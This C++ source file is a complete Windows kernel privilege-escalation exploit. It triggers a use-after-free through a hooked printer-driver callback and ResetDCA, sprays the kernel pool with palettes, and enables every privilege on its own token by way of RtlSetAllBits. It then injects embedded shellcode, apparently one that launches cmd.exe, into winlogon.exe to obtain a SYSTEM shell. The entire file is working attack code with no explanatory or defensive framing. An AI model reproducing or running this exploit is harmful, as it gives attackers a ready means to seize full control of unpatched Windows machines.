#include <Windows.h>
#include <winddi.h>
#include <stdio.h>
#include <Psapi.h>
#include <winternl.h>
#include <TlHelp32.h>

typedef struct
{
	DWORD64 Address;
	DWORD64 PoolSize;
	char PoolTag[4];
	char Padding[4];
} BIG_POOL_INFO, * PBIG_POOL_INFO;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS (* pNtQuerySystemInformation)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
 PVOID  SystemInformation,
 ULONG  SystemInformationLength,
 PULONG ReturnLength);

typedef NTSTATUS (* pNtSetInformationThread)
(HANDLE ThreadHandle,
 THREADINFOCLASS ThreadInformationClass,
 PVOID ThreadInformation,
 ULONG ThreadInformationLength);

typedef BOOL (* pDrvEnableDriver)(ULONG iEngineVersion, ULONG cj,DRVENABLEDATA* pded);

typedef void (*pDrvDisableDriver)();

typedef DHPDEV(*pDrvEnablePDEV)
(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns,
 ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi,
 HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

DHPDEV FakeDrvEnablePDEV
(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, 
 ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi,
 HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

namespace global
{
	CONST DWORD SystemHandleInformation = 0x10;
	CONST DWORD ThreadNameInformation = 0x26;
	CONST DWORD SystemBigPoolInformation = 0x42;
	DRVFN fakeDrvfn{ INDEX_DrvEnablePDEV , (PFN)FakeDrvEnablePDEV };
	DRVFN realDrvfn{ INDEX_DrvEnablePDEV, nullptr };
	pNtQuerySystemInformation NtQuerySystemInformation = nullptr;
	pNtSetInformationThread NtSetInformationThread = nullptr;
	HDC hdc = 0;
	DWORD pid = 0;
	LPSTR pPrinterName = nullptr;
	BOOL TriggerBugFlag = FALSE;
	ULONG64 kernelBase = 0;
	ULONG64 fakeBitmapHeader = 0;
	ULONG64 rtlSetAllBits = 0;
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
		"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
		"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
		"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
		"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
		"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
		"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
		"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
		"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
		"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
		"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
		"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
		"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
		"\x78\x65\x00";
}

VOID ErrorOutput(const char* msg)
{
	printf(msg);
	printf("[-] Error code: %d\n", GetLastError());
}

VOID GetKernelBaseAddress()
{
	PULONG_PTR driverBuffer = NULL;
	
	driverBuffer = (PULONG_PTR)malloc(0x1000);
	if (!driverBuffer)
	{
		ErrorOutput("[-] Failed to allocate a buffer for drivers information\n");
		exit(1);
	}

	DWORD length = 0;
	if (EnumDeviceDrivers((LPVOID*)driverBuffer, 0x1000, &length))
	{
		printf("[+] Get kernelbase address: 0x%I64x\n", driverBuffer[0]);
		global::kernelBase = driverBuffer[0];
	}
	else
	{
		ErrorOutput("[-] Failed to get kernelbase address\n");
		exit(1);
	}

	free(driverBuffer);
}

VOID PoolSpray()
{
	// initialize the PLOGPALETTE
	DWORD devobjSize = 0xe20;
	DWORD palNumEntries = (devobjSize - 0x90) / 4;
	DWORD bufSize = sizeof(LOGPALETTE) + (palNumEntries - 1) * sizeof(PALETTEENTRY);

	PLOGPALETTE pLogPalette = (PLOGPALETTE)malloc(bufSize);
	if (!pLogPalette)
	{
		ErrorOutput("[-] Failed to allocate a buffer for PLOGPALETTE\n");
		exit(1);
	}

	pLogPalette->palVersion = 0x300;
	pLogPalette->palNumEntries = palNumEntries;

	// make the pool fengshui
	PULONG64 paletteData = (PULONG64)pLogPalette->palPalEntry;

	// control the arg1(fake BitMapHeader)
	for (DWORD i = 0; i < 0x140; ++i)
	{
		paletteData[i] = global::fakeBitmapHeader;
	}

	// control the function pointer(rtlSetAllBits)
	for (DWORD i = 0x140; i < (palNumEntries * 4) / 8; ++i)
	{
		paletteData[i] = global::rtlSetAllBits;
	}

	// start to make pool spray
	for (DWORD i = 0; i < 5000; ++i)
	{
		CreatePalette(pLogPalette);
	}
}

DHPDEV FakeDrvEnablePDEV 
(	DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns,
	ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, 
	HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
{
	printf("[+] Enter the fake callback\n");

	// call the true function
	pDrvEnablePDEV DrvEnablePDEV = (pDrvEnablePDEV)global::realDrvfn.pfn;
	DHPDEV result = DrvEnablePDEV(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
	
	if (global::TriggerBugFlag)
	{
		global::TriggerBugFlag = FALSE;
		printf("[+] Trigger the uaf bug\n");
		ResetDCA(global::hdc, nullptr);
		
		printf("[+] Start pool spray\n");
		PoolSpray();
		printf("[+] Finish pool spray\n");
	}
	return result;
}

// find an available printer and hook its user callback
BOOL HookUserCallbackEntry()
{
	// get the buffer size to store the PRINTER_INFO_4 structures
	DWORD needBytes = 0, returnCount = 0;
	EnumPrintersA(PRINTER_ENUM_LOCAL, nullptr, 4, nullptr, 0, &needBytes, &returnCount);
	if (!needBytes) {
		ErrorOutput("[-] Failed to get buffer size for printer structures information\n");
		exit(1);
	}
	
	// allocate a buffer to store the PRINTER_INFO_4 structures 
	PPRINTER_INFO_4A pPrinterArray = (PPRINTER_INFO_4A)malloc(needBytes);
	if (!pPrinterArray) {
		ErrorOutput("[-] Failed to allocate a buffer for printer structures information\n");
		exit(1);
	}
	if (!EnumPrintersA(PRINTER_ENUM_LOCAL, nullptr, 4, (LPBYTE)pPrinterArray, needBytes, &needBytes, &returnCount)) {
		ErrorOutput("[-] Failed to enum printers information\n");
		exit(1);
	}

	PRINTER_INFO_4A pPrinterInfo = {0};
	// enum printer structure array
	for (DWORD idx = 0; idx < returnCount; ++idx)
	{
		pPrinterInfo = pPrinterArray[idx];
		if (!pPrinterInfo.pPrinterName)
			continue;
		printf("[+] Try the printer: %s\n", pPrinterInfo.pPrinterName);
		
		// open the printer
		HANDLE hPrinter;
		if (!OpenPrinterA(pPrinterInfo.pPrinterName, &hPrinter, nullptr))
		{
			ErrorOutput("[-] Failed to open the printer\n");
			continue;
		}
		printf("[+] Open the driver: %s\n", pPrinterInfo.pPrinterName);

		// get the driver path
		needBytes = 0;
		GetPrinterDriverA(hPrinter, nullptr, 2, nullptr, 0, &needBytes);
		if (!needBytes)
		{
			ErrorOutput("[-] Failed to get buffer size for printer driver structures information\n");
			continue;
		}
		PDRIVER_INFO_2A pDriverArray = (PDRIVER_INFO_2A)malloc(needBytes);
		if (!pDriverArray)
			ErrorOutput("[-] Failed to allocate a buffer for driver structures information\n");
		if (!GetPrinterDriverA(hPrinter, nullptr, 2, (LPBYTE)pDriverArray, needBytes, &needBytes))
		{
			ErrorOutput("[-] Failed to enum the printer drivers\n");
			continue;
		}
		printf("[+] Driver path: %s\n", pDriverArray->pDriverPath);
		
		// load the driver to memory with the absolute path
		HMODULE hDriver = LoadLibraryExA(pDriverArray->pDriverPath, nullptr, LOAD_WITH_ALTERED_SEARCH_PATH);
		if (!hDriver)
		{
			ErrorOutput("[-] Failed to load the driver to memory\n");
			continue;
		}
		global::pPrinterName = pPrinterInfo.pPrinterName;

		// get the function address
		pDrvEnableDriver DrvEnableDriver = nullptr;
		pDrvDisableDriver DrvDisableDriver = nullptr;
		DrvEnableDriver = (pDrvEnableDriver)GetProcAddress(hDriver, "DrvEnableDriver");
		DrvDisableDriver = (pDrvDisableDriver)GetProcAddress(hDriver, "DrvDisableDriver");
		if (!DrvEnableDriver || !DrvDisableDriver)
		{
			ErrorOutput("[-] Failed to get the function address\n");
			continue;
		}
		printf("[+] Get the DrvEnableDriver address: 0x%I64x\n", (ULONG64)DrvEnableDriver);
		printf("[+] Get the DrvDisableDriver address: 0x%I64x\n", (ULONG64)DrvDisableDriver);

		// get the driver's callback table
		DRVENABLEDATA drvEnableData;
		if (!DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(drvEnableData), &drvEnableData))
		{
			ErrorOutput("[-] Failed to get the drvEnableData\n");
			continue;
		}

		// enable the driver notice!!!
		DWORD protectValue = 0;
		if (!VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(DRVFN), PAGE_READWRITE, &protectValue))
		{
			ErrorOutput("[-] Failed to unprotect the callback table\n");
			continue;
		}

		// hook the callback table entry 
		for (DWORD idx = 0; idx < drvEnableData.c; ++idx)
		{
			if (drvEnableData.pdrvfn[idx].iFunc == global::fakeDrvfn.iFunc)
			{
				global::realDrvfn.pfn = drvEnableData.pdrvfn[idx].pfn;
				drvEnableData.pdrvfn[idx].pfn = global::fakeDrvfn.pfn;
				break;
			}
		}

		// diable the driver
		DrvDisableDriver();

		// reprotect the callback table
		VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(DRVFN), protectValue, &protectValue);

		printf("[+] Get real callback DrvEnablePDEV address: 0x%I64x\n", (ULONG64)global::realDrvfn.pfn);
		printf("[+] Get fake callback DrvEnablePDEV address: 0x%I64x\n", (ULONG64)global::fakeDrvfn.pfn);
		return TRUE;
	}

	return FALSE;
}

ULONG64 GetKernelObjectAddress(HANDLE handle, DWORD typeIndex)
{
	ULONG64 kernelObjAddress = 0;
	PSYSTEM_HANDLE_INFORMATION buffer = nullptr;

	buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x1000);
	if (!buffer)
	{
		ErrorOutput("[-] Failed to allocate a buffer for handle information\n");
		exit(1);
	}

	DWORD length = 0;
	DWORD status = global::NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)global::SystemHandleInformation, (PVOID)buffer, 0x1000, &length);
	if (status == 0xc0000004)
	{
		free(buffer);
		buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(length);
		if (!buffer || global::NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)global::SystemHandleInformation, (PVOID)buffer, length, &length))
		{
			ErrorOutput("[-] Failed to allocate a buffer for handle information\n");
			exit(1);
		}
	}

	for (DWORD i = 0; i < buffer->NumberOfHandles; ++i)
	{
		// check pid, type index, handle value
		if (buffer->Handles[i].UniqueProcessId == global::pid && buffer->Handles[i].ObjectTypeIndex == typeIndex && handle == (HANDLE)buffer->Handles[i].HandleValue)
		{
			kernelObjAddress = (ULONG64)buffer->Handles[i].Object;
			free(buffer);
			return kernelObjAddress;
		}
	}

	printf("[-] Failed to find the kernel object's address\n");
	free(buffer);

	return 0;
}

ULONG64 GetTokenAddress()
{
	HANDLE currProc = NULL, token = NULL;
	ULONG64 tokenAddress = 0;
	
	// get process handle 
	currProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, global::pid);
	if (!currProc)
	{
		ErrorOutput("[-] Failed to open the current process\n");
		exit(1);
	}
	 
	// get token handle
	if (!OpenProcessToken(currProc, TOKEN_ADJUST_PRIVILEGES, &token))
	{
		ErrorOutput("[-] Failed to open the current process token\n");
		exit(1);
	}

	// get the kernel address of the token
	for (DWORD i = 0; i < 0x100; ++i)
	{
		tokenAddress = GetKernelObjectAddress(token, 0x5);
		
		if (tokenAddress != 0)
		{
			printf("[+] Token: 0x%I64x\n", tokenAddress);
			return tokenAddress;
		}
	}

	printf("[-] Failed to get token's kernel address\n");
	return 0;
}

ULONG64 MakeFakeBitmapHeader(ULONG64 token)
{
	HANDLE hThread = NULL;
	HRESULT hResult = NULL;

	hThread = OpenThread(THREAD_SET_LIMITED_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread)
	{
		ErrorOutput("[-] Failed to open the current thread\n");
		exit(1);
	}

	DWORD length = 0x1000;
	PCHAR threadName = (PCHAR)VirtualAlloc(0, length, MEM_COMMIT, PAGE_READWRITE);
	if (!threadName)
	{
		ErrorOutput("[-] Failed to allocate a buffer for thread name\n");
		exit(1);
	}
	memset(threadName, 'a', length);

	// set BitMapHeader->SizeOfBitMap
	*(PULONG_PTR)threadName = 0x80;

	// set BitMapHeader->Buffer
	*(PULONG_PTR)(threadName + 8) = token;

	UNICODE_STRING message;
	message.Length = 0x1000;
	message.MaximumLength = 0xffff;
	message.Buffer = (PWSTR)threadName;

	hResult = global::NtSetInformationThread(hThread, (THREADINFOCLASS)global::ThreadNameInformation, (PVOID)&message, 0x10);
	if (hResult)
	{
		ErrorOutput("[-] Failed to set thread name\n");
		exit(1);
	}

	// query the big pool information
	length = 0x100000;
	LPVOID buffer = LocalAlloc(LPTR, length);

	hResult = global::NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)global::SystemBigPoolInformation, buffer, length, &length);
	if (hResult)
	{
		ErrorOutput("[-] Failed to query big pool\n");
		exit(1);
	}

	ULONG64 startAddress = (ULONG64)buffer;
	ULONG64 endAddress = (ULONG64)startAddress + 8 + (*((PDWORD)startAddress) * sizeof(BIG_POOL_INFO));
	ULONG64 ptr = startAddress + 8;
	ULONG64 dwExpectedSize = message.Length + sizeof(UNICODE_STRING);

	while (ptr < endAddress)
	{
		PBIG_POOL_INFO info = (PBIG_POOL_INFO)ptr;
		if (strncmp(info->PoolTag, "ThNm", 4) == 0 && dwExpectedSize == info->PoolSize)
		{
			return ((ULONG64)info->Address & 0xfffffffffffffff0) + sizeof(UNICODE_STRING);
		}

		ptr += sizeof(BIG_POOL_INFO);
	}

	printf("[-] Failed to get the fake bitmap header address\n");
	return 0;
}

VOID InjectToWinlogon()
{
	// inject shellcode to winlogon.exe
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	DWORD pid = 0;
	if (Process32First(snapshot, &entry))
	{
		while (Process32Next(snapshot, &entry))
		{
			if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
			{
				pid = entry.th32ProcessID;
				break;
			}
		}
	}

	CloseHandle(snapshot);

	if (!pid)
	{
		ErrorOutput("[-] Failed to find the winlogon.exe\n");
		exit(1);
	}

	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!proc)
	{
		ErrorOutput("[-] Failed to open the winlogon.exe\n");
		exit(1);
	}

	LPVOID buffer = VirtualAllocEx(proc, NULL, sizeof(global::shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!buffer)
	{
		ErrorOutput("[-] Failed to allocate a buffer for shellcode\n");
		exit(1);
	}

	if (!WriteProcessMemory(proc, buffer, global::shellcode, sizeof(global::shellcode), 0))
	{
		ErrorOutput("[-] Failed to write to remote memory\n");
		exit(1);
	}

	HANDLE hThread = CreateRemoteThread(proc, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);
	if (hThread == INVALID_HANDLE_VALUE)
	{
		ErrorOutput("[-] Failed to create remote thread\n");
		exit(1);
	}
}

VOID InitFunction()
{
	GetKernelBaseAddress();

	HMODULE hNtdll = NULL;

	hNtdll = LoadLibraryA("ntdll.dll");
	if (!hNtdll)
	{
		ErrorOutput("[-] Failed to load ntdll.dll\n");
		exit(1);
	}

	global::NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	global::NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");
	if (!global::NtQuerySystemInformation || !global::NtSetInformationThread)
	{
		ErrorOutput("[-] Failed to get NtQuerySystemInformation and NtSetInformationThread address\n");
		exit(1);
	}

	HMODULE hKernel = NULL;

	hKernel = LoadLibraryA("ntoskrnl.exe");
	if (!hKernel)
	{
		ErrorOutput("[-] Failed to load ntosknl.exe\n");
		exit(1);
	}

	ULONG64 rtlSetAllBitsOffset = (ULONG64)GetProcAddress(hKernel, "RtlSetAllBits");
	if (!rtlSetAllBitsOffset)
	{
		ErrorOutput("[-] Failed to get RtlSetAllBitsOffset\n");
		exit(1);
	}

	global::rtlSetAllBits = rtlSetAllBitsOffset - (ULONG64)hKernel + global::kernelBase;
	global::pid = GetCurrentProcessId();
	global::fakeBitmapHeader = MakeFakeBitmapHeader(GetTokenAddress() + 0x40);

}

int main(int argc, char** argv, char** envp)
{

	InitFunction();

	BOOL res = HookUserCallbackEntry();
	if (!res)
	{
		ErrorOutput("[-] Failed to hook the callback table\n");
		exit(1);
	}

	global::hdc = CreateDCA(nullptr, global::pPrinterName, nullptr, nullptr);
	if (!global::hdc)
	{
		ErrorOutput("[-] Failed to create dc\n");
		exit(1);
	}

	global::TriggerBugFlag = TRUE;
	ResetDCA(global::hdc, nullptr);

	printf("[+] Get system privilege\n");
	InjectToWinlogon();
	return 0;
}